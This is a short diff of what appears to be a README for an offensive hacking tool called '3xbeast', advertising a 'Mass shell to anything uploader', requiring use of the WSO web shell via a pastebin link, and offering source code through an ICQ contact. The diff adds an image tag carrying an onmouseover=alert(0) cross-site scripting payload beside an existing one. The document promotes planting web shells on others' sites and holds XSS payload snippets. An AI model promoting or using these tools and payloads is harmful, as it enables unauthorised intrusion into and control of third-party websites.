@@ -4,7 +4,8 @@
 For source code without encoding contact: ICQ 744324366<br><br>
 <img src="https://raw.githubusercontent.com/3xPr1nc3/3xbeast/master/beast.png" onmouseover=alert(0)>
 
-Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44
+Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44<br><br>
+<img src="https://raw.githubusercontent.com/3xPr1nc3/3xbeast/master/wso.png" onmouseover=alert(0)>
 
 
 1. Mass shell to anything uploader!: <br>
